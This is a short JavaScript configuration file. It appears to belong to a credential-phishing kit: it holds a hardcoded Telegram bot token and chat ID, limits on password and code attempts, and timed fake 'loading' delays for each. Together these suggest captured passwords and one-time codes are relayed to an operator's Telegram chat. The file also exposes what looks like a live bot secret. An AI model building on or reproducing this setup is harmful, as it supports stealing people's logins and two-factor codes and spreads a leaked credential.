const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8699038508:AAF2qdNQeLeJR7cS0Su5uFfdU-YbDgiUtgo',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1004464383324',
    MAX_PASS: 2,
    MAX_CODE: 4,
    PASSWORD_LOADING_TIME: 8,
    CODE_LOADING_TIME: 15
};

export default config;
